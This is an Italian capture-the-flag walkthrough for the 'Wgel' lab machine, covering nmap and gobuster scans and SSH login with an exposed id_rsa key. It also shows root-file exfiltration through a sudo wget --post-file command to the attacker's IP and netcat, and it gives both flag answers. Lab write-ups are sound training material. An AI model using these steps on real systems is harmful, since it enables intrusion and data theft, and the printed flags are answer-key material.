# Wgel CTF

_Difficoltà: Easy_

_________

# Task 1 - Wgel CTF

- sudo nmap -sS -sVC -Pn -p0- -A --open -T5 -vvv wgel.thm

![Screenshot_2023-10-09_22-07-59](https://github.com/Manganaccio/Manganaccio/assets/137283468/2a524a00-10df-40f8-8846-0667bc402fe5)

- essendo aperta la porta 80 si può visitare la pagina web, una volta visitata esaminare il codice sorgente della stessa

![Screenshot_2023-10-09_22-11-06](https://github.com/Manganaccio/Manganaccio/assets/137283468/79b5a617-4280-4f9a-ba32-5b51d673ad14)

- viene fornito un possibile username
- facciamo uno scan delle directories con gobuster

- gobuster dir -u http://wgel.thm -w /usr/share/wordlists/dirb/big.txt  --no-error -t 200

![3](https://github.com/Manganaccio/Manganaccio/assets/137283468/b03ed948-1796-4a67-b98a-8e7f2207701b)

- utilizziamo nuovamente gobuster per trovare ulteriori directories

- gobuster dir -u http://wgel.thm/sitemap -w /usr/share/wordlists/dirb/big.txt  --no-error -t 200 -x php,html

![4](https://github.com/Manganaccio/Manganaccio/assets/137283468/fa5a9ca9-ecde-44db-9eba-52ed7e9d9972)

- si noti tra le nuove directories ".ssh", accedendo troviamo un file denominato _id_rsa_ utile per fare l'accesso tramite SSH
- salviamo il contenuto in un file di testo e settiamo i permessi tramite il comando _chmod 600 id_rsa_
- facciamo l'accesso al servizio SSH con il nome utente trovato in precedenza eseguendo il seguente comando
- ssh jessie@wgel.thm -i id_rsa

# User flag

- una volta eseguito l'accesso nella directory Documents troviamo la prima flag

      Answer: 057c67131c3d5e42dd5cd3075b198ff6

# Root flag

- digitando il comando _sudo -l_ non ci viene richiesta la password dell'utente e ci viene fornita un'informazione utile per eseguire privilege escalation

![5](https://github.com/Manganaccio/Manganaccio/assets/137283468/344cbadb-4511-416c-b5b5-10aeb47c1f2c)

- navighiamo ora su GTFOBins e alla pagina _wget_ all'indicazione _File upload_ ci vengono forniti i comandi da eseguire sul terminale
- apriamo quindi una connessione nc sulla macchina attaccante e contemporaneamente ottenuto su GTFOBins
- eseguire sulla macchina vittima il comando _sudo /usr/bin/wget --post-file=/root/root_flag.txt http://'NOSTRO-IP':'PORTA'_ e contemporaneamente apriamo una connessione nc sulla macchina attaccante

![6](https://github.com/Manganaccio/Manganaccio/assets/137283468/03b8e818-f657-47e4-ad0c-c26216f39a77)

![7](https://github.com/Manganaccio/Manganaccio/assets/137283468/0df03445-046f-41b1-9d90-98dbb5d1ac5c)


      Answer: b1b968b37519ad1daa6408188649263d
